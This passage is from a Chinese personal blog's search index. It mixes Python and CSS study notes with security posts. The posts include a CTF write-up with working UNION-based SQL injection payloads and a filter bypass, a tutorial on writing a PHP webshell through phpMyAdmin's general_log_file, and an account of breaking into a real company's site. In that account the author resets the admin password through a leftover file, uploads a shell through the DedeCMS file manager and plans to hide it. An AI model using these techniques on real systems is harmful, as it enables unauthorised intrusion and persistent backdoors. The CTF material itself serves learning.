class="line">True</span><br><span class="line">&gt;&gt;&gt; str = &apos;scholar&apos;</span><br><span class="line">&gt;&gt;&gt; str.isdigit()</span><br><span class="line">False</span><br></pre></td></tr></table></figure><h3 id="字符串方法的实际运用"><a href="#字符串方法的实际运用" class="headerlink" title="字符串方法的实际运用"></a>字符串方法的实际运用</h3><p>任意读入一个字符串 判断是否为数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s=input(&quot;请任意输入一个数字字符串&quot;)##-1.23 1.23</span><br><span class="line">if s.startswith(&apos;-&apos;):</span><br><span class="line">    str1=s.split(&apos;-&apos;)##-1.23</span><br><span class="line">    str2=str1[1]</span><br><span class="line">elif s.startswith(&apos;+&apos;):</span><br><span class="line">    str1=s.split(&apos;+&apos;)</span><br><span class="line">    str2=str1[1]</span><br><span class="line">else:</span><br><span class="line">    str2=s</span><br><span class="line"></span><br><span class="line">dotCounts=str2.count(&apos;.&apos;)</span><br><span class="line">if dotCounts==0 and str2.isdigit()==True:</span><br><span class="line">    print(&quot;%s是一个数字&quot;%(s))</span><br><span class="line">elif dotCounts==1:</span><br><span class="line">    strList=str2.split(&apos;.&apos;)</span><br><span class="line">    if strList[0].isdigit() and strList[1].isdigit():</span><br><span class="line">        print(&quot;%s是一个数字&quot;%(s))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;%s不是一个数字&quot;%(s))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;%s不是一个数字&quot;%(s))</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记被大佬们带飞的一次NCTF</title>
      <link href="/2018/11/26/%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF/"/>
      <url>/2018/11/26/%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF/</url>
      <content type="html"><![CDATA[<p>前些天 国光老哥在群里问有没有打NJUPT CTF的 校外和他组队 然后问了问光光老哥说是 面向校外 不能太简单 但是对新手也不会太不友好 然后就本着去学东西 练习的态度 抱老哥的大腿去（嘻嘻）最后果然 校外队第九 咳咳 虽然我只是观众 大佬们都很强哟  但是也不希望自己一直都是观众 所以 特此总结一些题 希望以后越来越🐮🍺</p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/0.jpg" alt=""></p><a id="more"></a><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/1.png" alt=""></p><p>满怀自信的右键源代码 然后发现并没有flag 最后大佬们发现直接访问主域名 老把精力放在了secret.php 这上面</p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/2.jpg" alt=""></p><h1 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h1><p>这道题 是自己复习的重点了 </p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/3.jpg" alt=""></p><p>点进去 知道考察的是 mysql 注入 但是 当时自己就是搞不出来 还差的远 事后又请教了国光老哥 </p><h2 id="验证注入是否存在"><a href="#验证注入是否存在" class="headerlink" title="验证注入是否存在"></a>验证注入是否存在</h2><p>验证时候发现过滤了空格 用%a0即可绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;%a0||&apos;1</span><br></pre></td></tr></table></figure><p> 这里直接查询出所有的数据了</p><p>如果没有这个语句的话 默认只查询出1条数据 </p><p>‘ or ‘1 相当于构造出一个用真的条件 </p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/4.jpg" alt=""></p><h2 id="开始进行注入"><a href="#开始进行注入" class="headerlink" title="开始进行注入"></a>开始进行注入</h2><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/5.jpg" alt=""></p><p>​    咳咳 大佬语录记录一下 ！借助hackbar可以进行快速的注入</p><h3 id="判断注入的字段数"><a href="#判断注入的字段数" class="headerlink" title="判断注入的字段数"></a>判断注入的字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;%a0union%a0select%a01,2,3||&apos;1  </span><br><span class="line">&apos;             union select 1,2,3       ||&apos;1</span><br><span class="line">闭合前面的引号  核心语句 查报错的字段数      构造用真条件 闭合后面语句</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/6.jpg" alt=""></p><h3 id="所有数据库"><a href="#所有数据库" class="headerlink" title="所有数据库"></a>所有数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(schema_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.SCHEMATA),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/7.jpg" alt=""></p><p>咳咳根据我多年打酱油的经验 </p><h3 id="查询flaaaaaaag数据库下面的表"><a href="#查询flaaaaaaag数据库下面的表" class="headerlink" title="查询flaaaaaaag数据库下面的表"></a>查询flaaaaaaag数据库下面的表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(table_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA=0x666c6161616161616167),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/8.jpg" alt=""></p><p>f144444444g</p><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/9.png" alt=""></p><h3 id="查出数据"><a href="#查出数据" class="headerlink" title="查出数据"></a>查出数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/10.png" alt=""></p><p>nctf{this_1s_paocao_sqllllll} </p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>css样式那些事</title>
      <link href="/2018/11/05/css%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/2018/11/05/css%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      <content type="html"><![CDATA[<p>最近学校开了前端 希望通过自己的努力打开web前端的大门</p><p>最令人头疼的就是css的各种属性 真心事记住不 所以 写篇文章总结一下 </p><p><img src="/2018/11/05/css样式那些事/0.jpg" alt=""></p><a id="more"></a><h1 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h1><h2 id="常用单位"><a href="#常用单位" class="headerlink" title="常用单位"></a>常用单位</h2><p>首先看一下css样式的常用单位 </p><p>以 px像素为单位的 </p><p>em 对于文本类型的属性经常使用到</p><p>1em指一个字符 2em指两个字符(比如我们设置行高 两个字符的行高 就把这个属性的值设置成2em)</p><p>还有一个%为单位 这个不用多说了把</p><h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">color 文本的颜色 (red  #f00  rgd(255,0,0)  ) </span><br><span class="line">letter-spacing 字符间距 (2px -3px)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/1.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line-height      行高   (14px 1.5em 120%)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/2.jpg" alt=""></p><p>很多时候我们用这个来做垂直居中 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line-height =height   的时候 就会做到垂直居中</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/3.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-align  对齐(center居中 left左 right右 justify两端对齐不会让两端出现空白的部分）</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/4.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-decoration 装饰线</span><br></pre></td></tr></table></figure><p> (none无装饰线 默认情况下超链接下面都带有竖线 貌似很影响美观把 这时候none可将其取消，overline装饰线在文本的上方 underline装饰线在文本的下方  line-through 装饰线作为删除线贯穿文本之中)</p><p><img src="/2018/11/05/css样式那些事/5.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-indent首行缩进   (2em)</span><br></pre></td></tr></table></figure><h2 id="字体font"><a href="#字体font" class="headerlink" title="字体font"></a>字体font</h2><p><img src="/2018/11/05/css样式那些事/6.jpg" alt=""></p><p>老规矩还是一张图 节省时间学习新知识去 O(∩_∩)O</p><h1 id="背景超链接样式"><a href="#背景超链接样式" class="headerlink" title="背景超链接样式"></a>背景超链接样式</h1><h2 id="背景类型的样式"><a href="#背景类型的样式" class="headerlink" title="背景类型的样式"></a>背景类型的样式</h2><p>我们用background</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background-color: 背景颜色</span><br><span class="line"></span><br><span class="line">background-image:url(&quot;logo,jpg&quot;) 背景图片</span><br></pre></td></tr></table></figure><p>注意如果同时设置背景颜色和背景图片的话 背景图片会覆盖掉背景颜色</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">background-repeat: repeat背景图片的填充方式</span><br><span class="line"></span><br><span class="line">    repeat-x </span><br><span class="line"></span><br><span class="line">    repeat-y</span><br><span class="line"></span><br><span class="line">    no-repeat</span><br></pre></td></tr></table></figure><p>​     </p><p>可能显得太麻烦 太多 太难记 其实也可以用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background: 颜色 图片 repeat 来统一设置</span><br></pre></td></tr></table></figure><h2 id="连接的四种形态"><a href="#连接的四种形态" class="headerlink" title="连接的四种形态"></a>连接的四种形态</h2><p>超链接的样式是用a开头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:link --普通的未被访问的链接</span><br><span class="line">a:visited -用户已访问的链接</span><br><span class="line">a:hover -鼠标指针位于链接的上方悬停</span><br><span class="line">a:active - 链接被点击的时刻</span><br></pre></td></tr></table></figure><p>这种超链接或这种选择器的类型称为伪类选择器</p><p>这种位置分先后顺序的 l v h a</p><p><img src="/2018/11/05/css样式那些事/7.jpg" alt=""></p><p>四种状态下设置超链接样式时候的设置方式和设置顺序</p><p>a:hover也能做出简单的动画效果</p><p><img src="/2018/11/05/css样式那些事/8.jpg" alt=""></p><p>根据前面的学习不难看出 ，鼠标顶留在a标签文字上 字体放大 120% 这种简单的动画效果貌似还很常用的吧😁</p><h2 id="列表-表格样式"><a href="#列表-表格样式" class="headerlink" title="列表 表格样式"></a>列表 表格样式</h2><p>列表的样式吧 主要是list开头</p><p>列表的样式这里指无序列表(ul)和有序列表(ol) 共用样式有一下几种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list-style所有列表属性设置在这个声明中</span><br><span class="line"></span><br><span class="line">list-style-image为列表项设置图像</span><br><span class="line"></span><br><span class="line">list-style-position标志的位置</span><br><span class="line"></span><br><span class="line">list-style-type标志的类型</span><br></pre></td></tr></table></figure><h3 id="list-style-type-属性"><a href="#list-style-type-属性" class="headerlink" title="list-style-type 属性"></a>list-style-type 属性</h3><p>type属性对于有序和无序列表可以取得以下这些值</p><p><img src="/2018/11/05/css样式那些事/9.jpg" alt=""></p><p>前四种针对无序列表 后面针对有序列表</p><h3 id="list-style-position"><a href="#list-style-position" class="headerlink" title="list-style-position"></a>list-style-position</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">list-style-position:inside</span><br><span class="line"></span><br><span class="line">list-style-position:outside</span><br></pre></td></tr></table></figure><p>两者区别在哪 用文字说可能比较抽象 我们用一张图表示更加明确</p><p><img src="/2018/11/05/css样式那些事/10.jpg" alt=""></p><p><u>inside</u> 标号是向右缩进到这个列表区域之内</p><p><u>outside</u> 是在列表的左侧</p><h3 id="list-style-image"><a href="#list-style-image" class="headerlink" title="list-style-image"></a>list-style-image</h3><p>image属性可以规定列表的标号是一个图片：<u><strong>list-style-image:url(“1.jpg”);</strong></u></p><p>可以起到美化页面的作用</p><h3 id="表格样式"><a href="#表格样式" class="headerlink" title="表格样式"></a>表格样式</h3><p>表格样式主要是设置表格的高和宽 这个大家应该都知道</p><p>还有一个经常是用的就是<u>border</u> 边框属性</p><p>还有一个非常重要的<u>border-collapse</u>属性 合并默认表格样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">table&#123;</span><br><span class="line">width:100px;</span><br><span class="line">height:100px;</span><br><span class="line">border:1px solid #eee ; //一个像素宽 实线显示 灰色 每个属性之间用空格隔开</span><br><span class="line">border-collapse:collapse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/11.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python学习笔记</title>
      <link href="/2018/10/29/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/10/29/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p><img src="/2018/10/29/Python学习笔记/1.jpg" alt=""></p><p>入坑了python3 知识点颇多 看了一遍 看第二遍时候发现 和没看没什么两样 所以把某些知识点 记录一下 加深印象也方便 忘记时候查看</p><a id="more"></a><h1 id="组和数据类型"><a href="#组和数据类型" class="headerlink" title="组和数据类型"></a>组和数据类型</h1><h2 id="集合类型及操作"><a href="#集合类型及操作" class="headerlink" title="集合类型及操作"></a>集合类型及操作</h2><p>集合元素之间无序，每个元素唯一 不存在相同元素 ，集合元素是不可变数据类型，在Python中集合用{}表示，元素间用 “,”分隔</p><p>也可以用set()建立集合</p><p><img src="/2018/10/29/Python学习笔记/2.jpg" alt=""></p><p>set()将每个字符单独拆分 变成集合的元素</p><h3 id="集合操作符"><a href="#集合操作符" class="headerlink" title="集合操作符"></a>集合操作符</h3><p><img src="/2018/10/29/Python学习笔记/3.jpg" alt=""></p><p>可能有点难理解 那我们就打一下 </p><blockquote><blockquote><blockquote><p><code>a = {&quot;p&quot;,&quot;y&quot;,123}</code><br><code>b = set(&quot;pypy123&quot;)</code><br><code>a-b</code><br><code>{123}</code><br><code>b-a</code><br><code>{&#39;2&#39;, &#39;3&#39;, &#39;1&#39;}</code><br><code>a&amp;b</code><br><code>{&#39;y&#39;, &#39;p&#39;}</code><br><code>a|b</code><br><code>{&#39;3&#39;, &#39;1&#39;, &#39;2&#39;, &#39;y&#39;, 123, &#39;p&#39;}</code></p></blockquote></blockquote></blockquote><p>在四种基本操作符上python提供了增强操作符</p><p>通过四种操作符于赋值符号 来完成对集合s的更新</p><p><img src="/2018/10/29/Python学习笔记/4.jpg" alt=""></p><h3 id="集合处理方法"><a href="#集合处理方法" class="headerlink" title="集合处理方法"></a>集合处理方法</h3><p><code>s.add(x) 将x增加到集合s</code></p><p><code>s.discard(x) 从集合s中移除x 如果x不再集合s中，不报错</code></p><p><code>s.remove(x) 从集合s中移除x 如果x不再集合s中，报出KeyError</code></p><p><code>s.clear()移除s中所有元素</code></p><p><code>s.pop() 随机返回一个s元素 s为空则 报出KeyError</code></p><p><code>s.copy 返回集合s的一个副本</code></p><p><code>len(s) 返回集合s的元素个数</code></p><p><code>x in s 判断x是否在s中 是则True 否则False</code></p><p><code>set(x)将其他类型变量转换为集合</code></p><h3 id="集合类型总结"><a href="#集合类型总结" class="headerlink" title="集合类型总结"></a>集合类型总结</h3><p>集合类型 适用于包含关系的比较</p><p>举个例子</p><p><img src="/2018/10/29/Python学习笔记/5.jpg" alt=""></p><p>还有一个非常重要的 <u>数据去重</u> 就是利用 集合类型不能重复的特点</p><p>例如将一个List 去掉其中的重复元素 这里就可以用集合进行数据去重 非常简单容易</p><p><img src="/2018/10/29/Python学习笔记/6.jpg" alt=""></p><p>这里先用set 将list转换成集合来达到了 去重的目的 然后将集合在转换为列表。</p><h2 id="序列类型及操作"><a href="#序列类型及操作" class="headerlink" title="序列类型及操作"></a>序列类型及操作</h2><p>序列类型包括 字符串类型 元组类型和列表类型</p><h3 id="序列操作符"><a href="#序列操作符" class="headerlink" title="序列操作符"></a>序列操作符</h3><p><code>x in s 如果x是序列s的元素则返回True 否则返回Fals</code></p><p><code>s+t 链接两个序列 s+t</code></p><p><code>s * n或n * s 将序列s复制n次</code></p><p><code>s[i] 索引返回s中的第i个元素</code></p><p><code>s[i:j:k] 切片返回序列s中 i到j 且步长为k的元素序列</code></p><h3 id="序列函数和方法"><a href="#序列函数和方法" class="headerlink" title="序列函数和方法"></a>序列函数和方法</h3><p>len(s) 返回序列s的长度</p><p>min(s) 返回序列s的最小元素</p><p>max(s) 返回序列s的最大元素</p><p>s.count(x) 返回序列s中出现x的次数</p><h3 id="元组类型及操作"><a href="#元组类型及操作" class="headerlink" title="元组类型及操作"></a>元组类型及操作</h3><p>元组是序列类型的一种,使用() 或tuple()创建 </p><p><img src="/2018/10/29/Python学习笔记/7.jpg" alt=""></p><p>元素间用,分隔。元组创建以后不能修改</p><p>元组继承了序列全部通用操作 </p><h3 id="列表类型及操作"><a href="#列表类型及操作" class="headerlink" title="列表类型及操作"></a>列表类型及操作</h3><p>列表是序列类型的一种,使用[] 或list()创建 </p><p><img src="/2018/10/29/Python学习笔记/8.jpg" alt=""></p><p>元素间用,分隔。列表创建可以随意修改</p><h3 id="列表类型操作函数和方法"><a href="#列表类型操作函数和方法" class="headerlink" title="列表类型操作函数和方法"></a>列表类型操作函数和方法</h3><p>到这里内容很多 一会还要去上课 (其实是懒得打了)就从网上找了两张图 很详细</p><p><img src="/2018/10/29/Python学习笔记/9.jpg" alt=""></p><p><img src="/2018/10/29/Python学习笔记/10.jpg" alt=""></p><h3 id="序列类型总结"><a href="#序列类型总结" class="headerlink" title="序列类型总结"></a>序列类型总结</h3><p>序列类型 包括字符串 列表 元组</p><p>元组操作于序列基本相似，列表的话再序列基础上增加很多 更加灵活 </p><h2 id="字典类型及操作"><a href="#字典类型及操作" class="headerlink" title="字典类型及操作"></a>字典类型及操作</h2><h3 id="字典类型的定义"><a href="#字典类型的定义" class="headerlink" title="字典类型的定义"></a>字典类型的定义</h3><p>映射是一种键(索引)和值(数据)的对应</p><p>​    “城市”:”北京”</p><p>​    “姓名”:”周某人”</p><p>字典是键值对的集合，键值对之间无序</p><p>键值对：键是数据索引的扩展</p><p>采用{}和dict()创建键值对用·冒号:表示</p><p><img src="/2018/10/29/Python学习笔记/11.jpg" alt=""></p><p>在字典变量中通过建获得值 a[“中国”] 则会出现北京</p><h3 id="字典类型操作函数和方法"><a href="#字典类型操作函数和方法" class="headerlink" title="字典类型操作函数和方法"></a>字典类型操作函数和方法</h3><p><img src="/2018/10/29/Python学习笔记/12.jpg" alt=""></p><p><img src="/2018/10/29/Python学习笔记/13.jpg" alt=""></p><h3 id="字典类型的应用场景"><a href="#字典类型的应用场景" class="headerlink" title="字典类型的应用场景"></a>字典类型的应用场景</h3><p>统计数据出现的次数，数据是键 次数是值</p><p>主要作用：表达键值对数据 进而操作</p><h3 id="字典类型总结"><a href="#字典类型总结" class="headerlink" title="字典类型总结"></a>字典类型总结</h3><p>映射关系采用键值对表示</p><p>字典类型采用{}和dict()创建 键值对之间用:隔开</p><p>d[key] 既可以索引也可以赋值</p><p>牢记字典类型的操作函数</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php myadmin写shell</title>
      <link href="/2018/08/26/php%20myadmin%D0%B4shell/"/>
      <url>/2018/08/26/php%20myadmin%D0%B4shell/</url>
      <content type="html"><![CDATA[<p>有时候在渗透测试过程中 我们会得到php myadmin 的账号和密码 既然登陆了php myadmin 就可以用php myadmin 来get shell。 </p><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/1.png" alt=""></p>  <a id="more"></a> <h3 id="简单说明"><a href="#简单说明" class="headerlink" title="简单说明"></a>简单说明</h3><p>登陆进php myadmin 有些朋友可能会直接选择去写入一个webshell 执行后会弹出大概无法写入的意思 这里和php myadmin的设置有关系 在实战情况下一般都不能直接去写入一个shell的。</p><p>这时候我们需要换个思路</p><h3 id="利用mysql-错误日志写入一句话"><a href="#利用mysql-错误日志写入一句话" class="headerlink" title="利用mysql 错误日志写入一句话"></a>利用mysql 错误日志写入一句话</h3><p>这里需要先设置 general log (日志保存状态)general log file(日志保存路径)</p><p>先执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;general%&apos; a</span><br></pre></td></tr></table></figure><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/2.png" alt=""></p><p>我们需要把general log 改为ON 也就是打开状态</p><p>还要把general log file路径改为网站的根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;; </span><br><span class="line"></span><br><span class="line">set global general_log_file=&apos;D:/stduy/PHPTutorial/WWW/infos.php&apos;;</span><br></pre></td></tr></table></figure><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/3.png" alt=""></p><p>执行完后因为我是本地搭建环境所以可以看到成功创建了</p><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/4.png" alt=""></p><p>现在我们只需要输入一个错误的sql语句即可 这里我写入一句话 可以看到一句话已经存在于infos.php里面了</p><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/5.png" alt=""></p><p>之后我们菜刀直接链接即可</p><p><img src="/2018/08/26/php myadminдshell/php myadmin写shell/6.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>网上有许多相关的文章 不过自己写一遍印象才会更深刻吧</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php myadmin </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>渗透某企业</title>
      <link href="/2018/08/09/%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A/"/>
      <url>/2018/08/09/%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A/</url>
      <content type="html"><![CDATA[<p>在家无聊，突然想到博客搞上也有数天 没时间写文章，今天正好无聊</p><h2 id="实战内容"><a href="#实战内容" class="headerlink" title="实战内容"></a>实战内容</h2><h3 id="确定目标站"><a href="#确定目标站" class="headerlink" title="确定目标站"></a>确定目标站</h3><p><img src="/2018/08/09/渗透某企业/1.png" alt=""></p><a id="more"></a><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>相信很多人吧都会忽略信息收集这一块，完整的信息收集应该包括</p><p>收集 whois 邮箱</p><p>收集 子域名 c段 旁站</p><p>收集网站架构 运行的服务 对应的端口 探测 waf</p><p>google hacking 敏感文件</p><p> 收集网站的 cms 信息</p><h3 id="有所发现"><a href="#有所发现" class="headerlink" title="有所发现"></a>有所发现</h3><p>在信息收集的过程中我发现网站右上脚有</p><p><img src="/2018/08/09/渗透某企业/2.png" alt=""></p><p>因为主站是伪静态 我本人确实很排斥这种伪静态 我就点了英文版的站 就发现 </p><p>主站的url:<a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a></p><p>英文版url:<a href="http://www.xxx.com/en" target="_blank" rel="noopener">www.xxx.com/en</a></p><p>原来是分目录 English的站并没有做伪静态</p><p>准备对准他下手 习惯性的先扫描一番</p><p><img src="/2018/08/09/渗透某企业/3.png" alt=""></p><p>我发现了此文件 ,打开一看我尼玛 管理员真的粗心,是一个密码重置，管理员居然没有删</p><p><img src="/2018/08/09/渗透某企业/4.png" alt=""></p><p>因为我知道有admin 所以第一步直接填了admin 第二步即可重置，改完密码直接进入后台</p><p><img src="/2018/08/09/渗透某企业/5.png" alt=""></p><h3 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h3><p>dede cms拿shell很简单 有个文件管理器直接可上传get shell</p><p><img src="/2018/08/09/渗透某企业/6.png" alt=""></p><p>拿到shell后可直接跨目录</p><p>因为信息收集我发现是apache 还有.htacces文件 可以更好的隐藏我们的shell 这里我就不演示了</p><p>此篇没有什么技术含量 只当是做个笔记而已</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
